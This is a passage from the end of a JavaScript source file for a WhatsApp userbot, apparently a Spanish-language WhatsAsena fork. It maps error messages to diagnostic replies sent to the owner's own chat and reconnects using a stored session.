                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ANÁLISIS DE ERRORES [SKUELETOR] ⚕️*' + 
                                        '\n========== ```¡Error resuelto!``` ==========' +
                                        '\n\n*Error principal:* _División de indefinido_' +
                                        '\n*Razón:* _Los comandos que pueden usar los administradores de grupo ocasionalmente no ven la función de división._ ' +
                                        '\n*Solución:* _Reiniciar será suficiente._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('SSL')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ANÁLISIS DE ERRORES [SKUELETOR] ⚕️*' + 
                                        '\n========== ```¡Error resuelto!``` ==========' +
                                        '\n\n*Error principal:* _Error de base de datos SQL_' +
                                        '\n*Razón:* _Corrupción de la base de datos._ ' +
                                        '\n*Solución:* _No existe una solución conocida. Puede intentar reinstalarlo._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('Ookla')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ANÁLISIS DE ERRORES [SKUELETOR] ⚕️*' + 
                                        '\n========== ```¡Error resuelto!``` ==========' +
                                        '\n\n*Error principal:* _Conexión del servidor Ookla_' +
                                        '\n*Razón:* _Los datos de la prueba de velocidad no se pueden transmitir al servidor._' +
                                        '\n*Solución:* _Si lo usa una vez más, el problema se resolverá._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('params')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ANÁLISIS DE ERRORES [SKUELETOR] ⚕️*' + 
                                        '\n========== ```¡Error resuelto!``` ==========' +
                                        '\n\n*Error principal:* _Parámetros de audio solicitados_' +
                                        '\n*Razón:* _Usando el comando TTS fuera del alfabeto latino._' +
                                        '\n*Solución:* _El problema se resolverá si usa el comando en el marco de letras latinas._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unlink')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ANÁLISIS DE ERRORES [SKUELETOR] ⚕️*' + 
                                        '\n========== ```¡Error resuelto!``` ==========' +
                                        '\n\n*Error principal:* _El fichero o directorio no existe_' +
                                        '\n*Razón:* _Codificación incorrecta del complemento._' +
                                        '\n*Solución:* _Verifique los códigos de su complemento._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('404')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ANÁLISIS DE ERRORES [SKUELETOR] ⚕️*' + 
                                        '\n========== ```¡Error resuelto!``` ==========' +
                                        '\n\n*Error principal:* _Error 404 HTTPS_' +
                                        '\n*Razón:* _Problemas al comunicarse con el servidor como resultado del uso de los comandos del complemento Heroku._' +
                                        '\n*Solución:* _Espere un momento y vuelva a intentarlo. Si sigue apareciendo el error, realice la transacción en el sitio web._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('reply.delete')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ANÁLISIS DE ERRORES [SKUELETOR] ⚕️*' + 
                                        '\n========== ```¡Error resuelto!``` ==========' +
                                        '\n\n*Error principal:* _Eliminar la respuesta de la función ejecutada._' +
                                        '\n*Razón:* _Usando comandos IMG o Wiki._' +
                                        '\n*Solución:* _No hay solución para este error. Pero no es un error fatal._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('load.delete')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ANÁLISIS DE ERRORES [SKUELETOR] ⚕️*' + 
                                        '\n========== ```¡Error resuelto!``` ==========' +
                                        '\n\n*Error principal:* _Eliminar la respuesta de la función ejecutada._' +
                                        '\n*Razón:* _Usando comandos IMG o Wiki._' +
                                        '\n*Solución:* _No hay solución para este error. Pero no es un error fatal._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('400')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ANÁLISIS DE ERRORES [SKUELETOR] ⚕️*' + 
                                        '\n========== ```¡Error resuelto!``` ==========' +
                                        '\n\n*Error principal:* _Error de acción de Bailyes_ ' +
                                        '\n*Razón:* _Se desconoce la razón exacta. Más de una opción puede haber provocado este error._' +
                                        '\n*Solución:* _Si lo usa de nuevo, puede mejorar. Si el error continúa, puede intentar reiniciar._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('decode')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ANÁLISIS DE ERRORES [SKUELETOR] ⚕️*' + 
                                        '\n========== ```¡Error resuelto!``` ==========' +
                                        '\n\n*Error principal:* _No se puede decodificar texto o medios_' +
                                        '\n*Razón:* _Uso incorrecto del plugin._' +
                                        '\n*Solución:* _Utilice los comandos tal como están escritos en la descripción del complemento._'
                                        , MessageType.text
                                    );
                                }
                                else if (error.message.includes('unescaped')) {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*⚕️ ANÁLISIS DE ERRORES [SKUELETOR] ⚕️*' + 
                                        '\n========== ```¡Error resuelto!``` ==========' +
                                        '\n\n*Error principal:* _Uso de caracteres de palabras_' +
                                        '\n*Razón:* _Utilizando comandos como TTP, ATTP fuera del alfabeto latino._' +
                                        '\n*Solución:* _El problema se resolverá si usa el comando en alfabeto latino._'
                                        , MessageType.text
                                    );
                                }
                                else {
                                    return await WhatsAsenaCN.sendMessage(WhatsAsenaCN.user.jid, '*🙇🏻 ¡Lo siento, no he podido leer el error! 🙇🏻*' +
                                        '\n_Puedes escribir en nuestro grupo de soporte para obtener ayuda._'
                                        , MessageType.text
                                    );
                                }    
                            }
                        }
                    }
                }
            }
        )
    });
    // ==================== End Error Message ====================

    try {
        await WhatsAsenaCN.connect();
    } catch {
        if (!nodb) {
            console.log(chalk.red.bold('Cargando sesión de versión antigua...'))
            WhatsAsenaCN.loadAuthInfo(Session.deCrypt(config.SESSION)); 
            try {
                await WhatsAsenaCN.connect();
            } catch {
                return;
            }
        }
    }
}

whatsAsena();
